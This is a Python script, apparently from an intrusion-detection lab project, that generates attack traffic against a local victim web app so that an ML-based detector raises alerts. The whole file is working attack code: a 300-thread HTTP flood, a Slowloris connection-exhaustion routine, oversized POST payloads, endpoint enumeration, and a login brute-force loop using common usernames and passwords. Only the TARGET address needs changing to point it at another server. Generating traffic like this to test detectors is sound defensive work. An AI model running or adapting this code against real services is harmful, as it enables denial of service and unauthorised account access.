#!/usr/bin/env python3
"""
Powerful Attack Simulator - generates realistic attack traffic that WILL trigger IDS detection.

Simulates:
1. HTTP Flood: Rapid concurrent requests (high Total Fwd Packets, Bwd Packets/s)
2. Slowloris Attack: Slow partial headers (connection exhaustion)
3. Large Payload Attack: POST requests with huge data (high Packet Length Std, Average Packet Size)
4. Port Scan: Multiple endpoints discovery (high PSH Flag Count, connection patterns)
5. Brute Force: Repeated login attempts (suspicious patterns)

Target: http://localhost:4000 (Victim App)
Traffic captured by tcpdump → flow extraction → ML analysis → hybrid detection → dashboard alerts
"""

import random
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import socket
import urllib3

# Disable SSL warnings for localhost
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "http://192.168.1.11:4000"
NUM_THREADS = 300  # Increased threads
REQUESTS_PER_THREAD = 30  # More requests per thread
PAYLOAD_SIZES = [1000, 5000, 10000, 20000, 50000]  # Larger payloads
BURST_CYCLES = 8  # More burst cycles
SLEEP_BETWEEN_BURSTS = 0.05  # Less sleep = more intense

# Attack endpoints that exist on victim app
ENDPOINTS = [
    "/", "/login", "/search", "/contact", "/profile", "/about", "/help", "/dashboard"
]

# Common usernames for brute force simulation
USERNAMES = ["admin", "user", "test", "guest", "root", "administrator"]
PASSWORDS = ["password", "123456", "admin", "test", "guest", "root"]


def http_flood_worker(thread_id):
    """HTTP Flood: Rapid concurrent requests to overwhelm the server."""
    count = 0
    for i in range(REQUESTS_PER_THREAD):
        try:
            # Random endpoints to simulate port scan behavior
            endpoint = random.choice(ENDPOINTS)
            url = f"{TARGET}{endpoint}"
            
            # Mix of GET and POST requests
            if i % 3 == 0:
                # POST request with small data
                data = {"query": "test" * 10, "user": f"user{thread_id}"}
                requests.post(url, data=data, timeout=1)
            else:
                # GET request
                requests.get(url, timeout=1)
            count += 1
        except Exception:
            pass  # Silently continue to generate maximum traffic
    return count


def slowloris_worker(thread_id):
    """Slowloris Attack: Send partial HTTP headers slowly to keep connections open."""
    count = 0
    for _ in range(REQUESTS_PER_THREAD // 2):  # Fewer but longer connections
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Connect to victim app
            sock.connect(('192.168.1.11', 4000))
            
            # Send partial header slowly
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: 192.168.1.11:4000\r\n")
            sock.send(b"User-Agent: ")
            
            # Send remaining header very slowly to keep connection open
            for i in range(20):
                sock.send(b"a")
                time.sleep(0.1)
            
            sock.close()
            count += 1
        except Exception:
            pass
    return count


def large_payload_worker(thread_id):
    """Large Payload Attack: Send huge POST requests to increase packet sizes."""
    count = 0
    for _ in range(REQUESTS_PER_THREAD // 3):  # Fewer but larger requests
        try:
            size = random.choice(PAYLOAD_SIZES)
            payload = "x" * size
            
            # Try different endpoints for large payloads
            endpoints_with_data = ["/contact", "/search", "/profile"]
            endpoint = random.choice(endpoints_with_data)
            url = f"{TARGET}{endpoint}"
            
            # Large POST request
            data = {
                "message": payload,
                "comment": payload,
                "data": payload,
                "content": payload
            }
            
            requests.post(url, data=data, timeout=3)
            count += 1
        except Exception:
            pass
    return count


def brute_force_worker(thread_id):
    """Brute Force Attack: Simulate repeated login attempts."""
    count = 0
    for _ in range(REQUESTS_PER_THREAD // 4):  # Login attempts
        try:
            username = random.choice(USERNAMES)
            password = random.choice(PASSWORDS)
            
            # POST to login endpoint
            data = {
                "username": username,
                "password": password,
                "submit": "Login"
            }
            
            response = requests.post(f"{TARGET}/login", data=data, timeout=2)
            count += 1
        except Exception:
            pass
    return count


def port_scan_worker(thread_id):
    """Port Scan: Rapid requests to multiple endpoints to simulate discovery."""
    count = 0
    for _ in range(REQUESTS_PER_THREAD):
        try:
            # Try different endpoints and parameters
            endpoint = random.choice(ENDPOINTS)
            params = {
                "id": random.randint(1, 1000),
                "user": f"user{thread_id}",
                "search": "test",
                "query": "admin"
            }
            
            requests.get(f"{TARGET}{endpoint}", params=params, timeout=1)
            count += 1
        except Exception:
            pass
    return count


def main():
    print("=" * 80)
    print("🚀 POWERFUL ATTACK SIMULATION STARTING")
    print("=" * 80)
    print(f"🎯 Target: {TARGET}")
    print(f"🔥 Threads: {NUM_THREADS}")
    print(f"💥 Requests per thread: {REQUESTS_PER_THREAD}")
    print(f"📊 Total potential requests: {NUM_THREADS * REQUESTS_PER_THREAD}")
    print("=" * 80)
    
    start = time.time()
    total_sent = 0

    # Phase 1: HTTP Flood - Maximum concurrent requests
    print("\n🌊 [PHASE 1] HTTP FLOOD ATTACK")
    print("⚡ Sending rapid concurrent requests...")
    
    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        futures = [executor.submit(http_flood_worker, i) for i in range(NUM_THREADS)]
        phase1_count = sum(f.result() for f in as_completed(futures))
    
    total_sent += phase1_count
    print(f"✅ Phase 1 Complete: {phase1_count} requests sent")

    # Phase 2: Port Scan - Multiple endpoint discovery
    print("\n🔍 [PHASE 2] PORT SCAN ATTACK")
    print("📡 Scanning multiple endpoints...")
    
    scan_threads = 100
    with ThreadPoolExecutor(max_workers=scan_threads) as executor:
        futures = [executor.submit(port_scan_worker, i) for i in range(scan_threads)]
        phase2_count = sum(f.result() for f in as_completed(futures))
    
    total_sent += phase2_count
    print(f"✅ Phase 2 Complete: {phase2_count} requests sent")

    # Phase 3: Large Payload Attack - Huge POST requests
    print("\n💣 [PHASE 3] LARGE PAYLOAD ATTACK")
    print("📦 Sending massive POST requests...")
    
    payload_threads = 50
    with ThreadPoolExecutor(max_workers=payload_threads) as executor:
        futures = [executor.submit(large_payload_worker, i) for i in range(payload_threads)]
        phase3_count = sum(f.result() for f in as_completed(futures))
    
    total_sent += phase3_count
    print(f"✅ Phase 3 Complete: {phase3_count} requests sent")

    # Phase 4: Brute Force Attack - Login attempts
    print("\n🔓 [PHASE 4] BRUTE FORCE ATTACK")
    print("🔨 Simulating login attempts...")
    
    brute_threads = 30
    with ThreadPoolExecutor(max_workers=brute_threads) as executor:
        futures = [executor.submit(brute_force_worker, i) for i in range(brute_threads)]
        phase4_count = sum(f.result() for f in as_completed(futures))
    
    total_sent += phase4_count
    print(f"✅ Phase 4 Complete: {phase4_count} requests sent")

    # Phase 5: Slowloris Attack - Connection exhaustion
    print("\n🐌 [PHASE 5] SLOWLORIS ATTACK")
    print("🕸️ Opening slow connections...")
    
    slow_threads = 20
    with ThreadPoolExecutor(max_workers=slow_threads) as executor:
        futures = [executor.submit(slowloris_worker, i) for i in range(slow_threads)]
        phase5_count = sum(f.result() for f in as_completed(futures))
    
    total_sent += phase5_count
    print(f"✅ Phase 5 Complete: {phase5_count} slow connections sent")

    # Final Statistics
    elapsed = time.time() - start
    rps = total_sent / elapsed if elapsed > 0 else 0
    
    print("\n" + "=" * 80)
    print("🎯 ATTACK SIMULATION COMPLETE")
    print("=" * 80)
    print(f"📊 Total Requests Sent: {total_sent}")
    print(f"⏱️ Total Time: {elapsed:.2f} seconds")
    print(f"🚀 Requests Per Second: {rps:.0f}")
    print(f"📈 Phase 1 (HTTP Flood): {phase1_count}")
    print(f"📈 Phase 2 (Port Scan): {phase2_count}")
    print(f"📈 Phase 3 (Large Payload): {phase3_count}")
    print(f"📈 Phase 4 (Brute Force): {phase4_count}")
    print(f"📈 Phase 5 (Slowloris): {phase5_count}")
    print("=" * 80)
    print("🔥 CHECK DASHBOARD: http://localhost:5173")
    print("🔥 ATTACKS SHOULD BE DETECTED NOW!")
    print("=" * 80)


if __name__ == "__main__":
    main()
